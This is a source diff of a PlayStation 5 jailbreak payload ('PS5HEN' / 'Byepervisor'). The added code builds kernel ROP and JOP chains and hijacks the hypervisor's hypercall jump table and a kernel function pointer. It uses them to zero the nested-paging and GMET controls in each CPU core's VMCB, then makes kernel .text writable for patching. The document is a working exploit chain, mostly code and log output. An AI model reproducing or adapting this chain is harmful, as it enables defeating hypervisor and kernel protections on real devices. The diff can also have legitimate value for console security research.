@@ -23,6 +23,19 @@ extern "C" {
 #include "patching.h"
 #include "self.h"
 #include "util.h"
+#include "krop.h"
+
+
+struct kctx {
+    uint64_t rbx;
+    uint64_t rsp;
+    uint64_t rbp;
+    uint64_t r12;
+    uint64_t r13;
+    uint64_t r14;
+    uint64_t r15;
+    uint64_t ret;
+};
 
 int g_debug_sock = -1;
 
@@ -72,19 +85,58 @@ void dump_kernel_to_client(int client)
     SOCK_LOG("[+] Done\n");
 }
 
+uint64_t find_hv_data_start()
+{
+    int num_text_pages;
+    void* temp_buf[0x1000];
+
+    num_text_pages = (int) ((KERNEL_ADDRESS_DATA_BASE - ktext(0)) / 0x1000);
+    SOCK_LOG("[+] Searching kernel .text for signature of hv_data_section (.text pages = 0x%x)\n", num_text_pages);
+
+    for (int i = 0; i < num_text_pages; i++) 
+    {
+        uint64_t current_text_addr = ktext(0 + (i * 0x1000));
+
+        kernel_copyout( current_text_addr, &temp_buf, sizeof(temp_buf));
+        
+        /*
+        ffffffff8ec8f113  48 63 c3                 movsxd  rax, ebx
+        ffffffff8ec8f116  48 8d 0d 53 57 d4 03     lea     rcx, [rel data_ffffffff929d4870]
+        ffffffff8ec8f11d  4c 8d 25 dc 0e 09 00     lea     r12, [rel hv_data_section]
+        ffffffff8ec8f124  89 5d a8                 mov     dword [rbp-0x58 {var_60}], ebx
+        */
+
+        uint64_t pattern_addr = find_pattern( temp_buf, sizeof(temp_buf), "4C 8D 25 ? ? ? ? 89 5D A8");
+        if (pattern_addr)
+        {
+            SOCK_LOG("[+] Found pattern -> 0x%lX\n", pattern_addr);
+            SOCK_LOG("[+] kernel text page address -> 0x%lX\n", current_text_addr);
+
+            // add now kernel text address to make it absolute pointer
+            pattern_addr += current_text_addr;
+
+            SOCK_LOG("[+] Absolute address of pattern at 0x%lX\n", pattern_addr);
+
+            // Resolve LEA r12, [rip + disp32] (4C 8D 25 xx xx xx xx)
+            int32_t lea_disp = (int32_t)kernel_read4(pattern_addr + 3);
+            uint64_t hv_data_start = pattern_addr + 7 + lea_disp;
+            SOCK_LOG("[+] hv_data_section -> 0x%lX\n", hv_data_start);
+
+            return hv_data_start;
+        }
+    }
+
+    SOCK_LOG("[!] Pattern not found\n");
+    return 0;
+}
+
+
 int main()
 {
     int ret;
-    int debug_sock = -1;
-    struct sockaddr_in addr;
-    uint64_t kernel_pmap;
-    uint64_t pte_addr;
-    uint64_t pde_addr;
-    uint64_t pte;
-    uint64_t pde;
-
-    // Set shellcore auth ID
-    kernel_set_ucred_authid(getpid(), 0x4800000000000007);
+	int debug_sock = -1;
+	struct sockaddr_in addr;
+    uint32_t *mirror_hv_jmptable_ent;
 
     // Open a debug socket if enabled
     if (PC_DEBUG_ENABLED) {
@@ -107,13 +159,153 @@ int main()
         g_debug_sock = debug_sock;
     }
 
+    // Do fw support check
+    SOCK_LOG("[+] Detected FW: 0x%x\n", kernel_get_fw_version());
+    if (kdlsym(KERNEL_SYM_HV_JMP_TABLE) == 0) {
+        SOCK_LOG("[!] FW 0x%x is not supported\n", kernel_get_fw_version());
+        return -1;
+    }
+
+     // Set shellcore auth ID
+    kernel_set_ucred_authid(getpid(), 0x4800000000000007);
+
     // Jailbreak
     kernel_set_proc_rootdir(getpid(), kernel_get_root_vnode());
 
-    kernel_pmap = kdlsym(KERNEL_SYM_PMAP_STORE);
+    // Kernel ROP gadgets
+    uint64_t hv_rop_chain[] = {
+        0x0,
+
+        KROP_GADGET_POP_RAX,
+        KROP_DATA_CAVE_SAVECTX + 0x28,      
+        KROP_GADGET_MOV_RAX_QWORD_PTR_RAX,  // rax = [savectx + 0x28] = r14
+        KROP_GADGET_POP_RDX,
+        0x8,
+        KROP_GADGET_ADD_RAX_RDX,
+        KROP_GADGET_MOV_RAX_QWORD_PTR_RAX,  // rax = [r14 + 0x8] = VMCB
+        KROP_GADGET_POP_RDX,
+        0x90,
+        KROP_GADGET_ADD_RAX_RDX,            // rax = VMCB->ctrl_90h (NP_ENABLE, GMET, SEV, etc.)
+        KROP_GADGET_MOV_QWORD_PTR_RAX_0,    // *rax = 0
+
+        KROP_GADGET_POP_RDI,
+        KROP_DATA_CAVE_SAVECTX + 0x38,      // rdi = savectx + 0x38
+        KROP_GADGET_POP_RSI,
+        KROP_GADGET_RETURN_ADDR,
+        KROP_GADGET_MOV_QWORD_PTR_RDI_RSI,  // *(save_ctx + 0x38) = ret;
+        KROP_GADGET_POP_RDI,
+        KROP_DATA_CAVE_SAVECTX,             // rdi = savectx
+        KROP_GADGET_LONGJMP,                // longjmp to return cleanly
+        KROP_GADGET_INFLOOP,                // jmp 0
+    };
+
+    // Mirror map the hypervisor's jump table in kernel data
+    mirror_hv_jmptable_ent = (uint32_t *) get_mirrored_addr(KROP_HV_JMP_TABLE_HYPERCALL_ENT);
+
+    // Create context
+    struct kctx ropctx;
+
+    ropctx.rbx = 0;
+    ropctx.rsp = KROP_DATA_CAVE_ROP_CHAIN;
+    ropctx.rbp = 0;
+    ropctx.r12 = 0;
+    ropctx.r13 = 0;
+    ropctx.r14 = 0;
+    ropctx.r15 = 0;
+    ropctx.ret = KROP_GADGET_RET;
+
+    // Copy rop context and HV rop chain into kernel memory
+    SOCK_LOG("[+] Copying in ROP ctx and chain\n");
+    kernel_copyin(&ropctx, KROP_DATA_CAVE_ROPCTX, sizeof(ropctx));
+    kernel_copyin(&hv_rop_chain, KROP_DATA_CAVE_ROP_CHAIN, sizeof(hv_rop_chain));
+
+    // Setup savectx area for popping into RSI register
+    SOCK_LOG("[+] Writing RSI ptr\n");
+    kernel_write8(KROP_DATA_CAVE_RSI_PTR, KROP_DATA_CAVE_SAVECTX);
+
+    // Backup original function pointer and hypercall jmp table offset
+    SOCK_LOG("[+] Reading original function ptr for jop gadget 2\n");
+    uint64_t orig_fptr = kernel_read8(KROP_FUNC_PTR);
+    SOCK_LOG("  [+] 0x%lx\n", orig_fptr);
+
+    SOCK_LOG("[+] Reading original hypercall jmp table offset\n");
+    uint32_t orig_offset = *mirror_hv_jmptable_ent;
+    SOCK_LOG("  [+] 0x%x\n", orig_offset)
+
+    // Set function pointer hijack to longjmp and hypercall jmp table offset to JOP chain
+    SOCK_LOG("[+] Replacing function with longjmp (0x%lx)\n", KROP_GADGET_LONGJMP);
+    kernel_write8(KROP_FUNC_PTR, KROP_GADGET_LONGJMP);
+    SOCK_LOG("  [+] 0x%lx\n", kernel_read8(KROP_FUNC_PTR));
+
+    SOCK_LOG("[+] Replacing offset with JOP gadget 1 (0x%lx)\n", KROP_JOP1_OFFSET_FROM_JMP_TABLE);
+    *mirror_hv_jmptable_ent = KROP_JOP1_OFFSET_FROM_JMP_TABLE;
+    SOCK_LOG("  [+] 0x%x\n", kernel_read4(KROP_HV_JMP_TABLE_HYPERCALL_ENT));
+
+    // Run a kernel ROP chain to kickstart vmmcall hijack
+    struct krop_manage *krop = create_krop_chain();
+
+    // r9 = setjmp
+    kernel_write8(KROP_DATA_CAVE + 0x1048, KROP_GADGET_SETJMP);
+    krop_push(krop, KROP_GADGET_POP_RDI);
+    krop_push(krop, KROP_DATA_CAVE + 0x1000);
+    krop_push(krop, KROP_GADGET_POP_RAX);
+    krop_push(krop, KROP_GADGET_RET);
+    krop_push(krop, KROP_GADGET_MOV_R9_QWORD_PTR_RDI_48h);
+
+    // rbx = ropctx
+    krop_push(krop, KROP_GADGET_POP_RBX);                     
+    krop_push(krop, KROP_DATA_CAVE_ROPCTX);
+
+    // rsi = rsi ptr
+    krop_push(krop, KROP_GADGET_POP_RSI);                     
+    krop_push(krop, KROP_DATA_CAVE_RSI_PTR);
+
+    // r12 = JOP 2 offset
+    krop_push(krop, KROP_GADGET_POP_R12);
+    krop_push(krop, KROP_JOP2_OFFSET_FROM_JMP_TABLE);
+
+    // hypercall
+    krop_push(krop, KROP_GADGET_HYPERCALL_SET_CPUID_PS4);
+
+    // return cleanly
+    krop_push(krop, KROP_GADGET_POP_R12);
+    krop_push(krop, ktext(0x470BD50));
+    krop_push(krop, KROP_GADGET_RET);
+    krop_push(krop, KROP_GADGET_RET);
+    krop_push(krop, KROP_GADGET_RET);
+    krop_push(krop, KROP_GADGET_RET);
+    krop_push_exit(krop);
+
+    // Run the ROP chain
+    SOCK_LOG("[+] About to ROP (disable NPT/GMET in VMCB)...\n");
+    sceKernelSleep(1);
+
+    krop_run(krop);
+
+    // At this point, HV should be broken on the core we ROP'd on, restore original values
+    SOCK_LOG("[+] Byepervisor :)\n");
+    SOCK_LOG("[+] Restoring hijacked function ptr\n");
+    kernel_write8(KROP_FUNC_PTR, orig_fptr);
+
+    SOCK_LOG("[+] Restoring hijacked offset\n");
+    *mirror_hv_jmptable_ent = orig_offset;
+
+    // We must pin to the same core we ran the ROP chain on, as the hypervisor is only broken on
+    // that core.
+    pin_to_core(krop->core);
+    SOCK_LOG("[+] Pinned to core: 0x%x\n", get_cpu_core());
+
+    SOCK_LOG("[+] Hypervisor should be broken on core 0x%x (nested paging disabled)\n", get_cpu_core());
+
+    uint64_t kernel_pmap = kdlsym(KERNEL_SYM_PMAP_STORE);
     SOCK_LOG("[+] Kernel pmap = 0x%lx\n", kernel_pmap);
 
-    // Disable xotext + enable write  on kernel .text pages
+    uint64_t pte_addr;
+    uint64_t pde_addr;
+    uint64_t pte;
+    uint64_t pde;
+
+    // Disable xotext + enable write on kernel .text pages
     SOCK_LOG("[+] Disabling xotext + enabling write\n");
     for (uint64_t addr = ktext(0); addr < KERNEL_ADDRESS_DATA_BASE; addr += 0x1000) {
         pde_addr = find_pde(kernel_pmap, addr, &pde);
@@ -131,31 +323,62 @@ int main()
         }
     }
 
-    // Check if this is a resume state or not, if it's not, prompt for restart and exit
-    if (kernel_read4(kdlsym(KERNEL_SYM_DATA_CAVE)) != 0x1337) {
-        // Notify the user that they have to suspend/resume their console
-        flash_notification("[PS5HEN] Entering rest mode for in 3 secs\nRe-run Byepervisor after resuming to continue...");
-        kernel_write4(kdlsym(KERNEL_SYM_DATA_CAVE), 0x1337);
-        sleep(3);
-        sceSystemStateMgrEnterStandby();
-		return 0;
-    }
-    else
+    flash_notification("Hypervisor partially broken, searching now for signature!");
+
+    uint64_t hv_data_start = find_hv_data_start();
+
+    SOCK_LOG(".text -> 0x%lx\n", ktext(0));
+    SOCK_LOG(".data -> 0x%lx\n", KERNEL_ADDRESS_DATA_BASE );
+
+    if(!hv_data_start)
     {
-    SOCK_LOG("[+] Loading PS5HEN By SpecterDev\n");
-	flash_notification(
-    	    "Welcome To PS5HEN 1.1\nPlayStation 5 FW: %u.%u\nBy SpecterDev",
-    	    (kernel_get_fw_version() >> 24) & 0xF,
-    	    ((kernel_get_fw_version() >> 20) & 0xF) * 10 + ((kernel_get_fw_version() >> 16) & 0xF)
-	);
+        SOCK_LOG("[!] Aborting because I couldn't find the signature in the kernel.");
+        reset_mirrors();
+        return 0;
     }
 
-    // Print out the kernel base
-    SOCK_LOG("[+] Kernel base = 0x%lx\n", ktext(0));
+    SOCK_LOG("[+] .hv_data -> 0x%lx\n", hv_data_start );
 
-    // run_dump_server(9003);
-    // reset_mirrors();
-    // return 0;
+    uint64_t broken_vcpu = kernel_read8( KROP_DATA_CAVE_SAVECTX + 0x28 );
+    SOCK_LOG("[+] broken vCPU -> 0x%lx\n", broken_vcpu );
+
+    uint64_t broken_vmcb = kernel_read8( broken_vcpu + 0x8 );
+    SOCK_LOG("[+] broken VMCB -> 0x%lx\n", broken_vmcb );
+
+    uint64_t broken_vmcb_np = kernel_read8( broken_vmcb + 0x90 );
+    SOCK_LOG("[+] broken VMCB->ctrl_90h (NP) -> 0x%lX\n", broken_vmcb_np );
+
+    // patch now all other vmcbs to defeat hv on other cores
+    for( int core = 0; core < 16; core++ )
+    {
+        /*
+            ffffffff8ec8f11d  4c 8d 25 dc 0e 09 00      lea     r12, [rel hv_data_section]  <---- r12 = .hv_data begin
+
+            ffffffff8ec8f131  4c 69 f8 28 01 00 00      imul    r15, rax, 0x128             <---- r15 = cpuid * 0x128
+
+            ffffffff8ec8f201  4b 89 9c 27 10 01 00 00   mov     qword [r15+r12+0x110], rbx  <---- vcpu
+
+            ffffffff8ec8f229  4b 89 84 27 98 13 00 00   mov     qword [r15+r12+0x1398], rax <---- vmcb
+        */
+	    uint64_t current_vmcb = kernel_read8( hv_data_start + 0x1398 + core * 0x128 );
+
+	    SOCK_LOG("[-] curret_vmcb -> 0x%lX\n", current_vmcb);
+
+	    uint64_t current_vmcb_np = kernel_read8( current_vmcb + 0x90 );
+
+	    SOCK_LOG("\t current_vmcb->np -> 0x%lX\n", current_vmcb_np );
+
+	    // disable now NP+GMET
+	    kernel_write8( current_vmcb + 0x90, 0LL );
+	    
+	    current_vmcb_np = kernel_read8( current_vmcb + 0x90 );
+
+	    SOCK_LOG("\t current_vmcb->np (after write) -> 0x%lX\n", current_vmcb_np );
+    }
+
+    SOCK_LOG("[+] Hypervisor should now be broken on all cores (NP+GMET disabled).\n");
+     
+    SOCK_LOG("[+] Loading PS5HEN By SpecterDev\n");
 
     // Apply patches
     if (apply_kernel_patches() != 0) {
@@ -192,8 +415,14 @@ int main()
 
     SOCK_LOG("[+] Aft. hook is_development_mode = 0x%x\n", __sys_is_development_mode());
 
+    flash_notification(
+    	    "Welcome To PS5HEN 1.2\nPlayStation 5 FW: %u.%u\nBy SpecterDev",
+    	    (kernel_get_fw_version() >> 24) & 0xF,
+    	    ((kernel_get_fw_version() >> 20) & 0xF) * 10 + ((kernel_get_fw_version() >> 16) & 0xF)
+	);
+
     reset_mirrors();
-    run_self_server(9004);
+    //run_self_server(9004);
 
     return 0;
 }
